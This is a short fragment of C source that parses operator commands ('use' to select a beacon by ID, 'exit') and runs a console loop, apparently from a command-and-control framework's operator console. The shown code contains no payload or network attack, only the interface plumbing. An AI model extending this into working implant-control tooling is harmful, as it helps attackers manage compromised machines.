    } else if (strncmp(input, "use ", 4) == 0) {
        int id = atoi(input + 4);
        if (id < 0 || id >= beacon_count) {
            printf(RED "  [ERROR]: Invalid beacon ID: %d\n" CRESET, id);
        } else {
            beacon_prompt(id);
        }
    } else if (strcmp(input, "exit\n") == 0) {
        printf("Goodbye!\n\n");
        return 1;
    } else {
        printf(RED "  [ERROR]: Unknown command: %s" CRESET, input);
    }
    return 0;
}

int console() {
    // Print the header
    banner();

    while(!prompt());

    return 0;
}



int main() {
    // Initialize running semaphore
    running = 1;

    // Launch the console
    return console();
}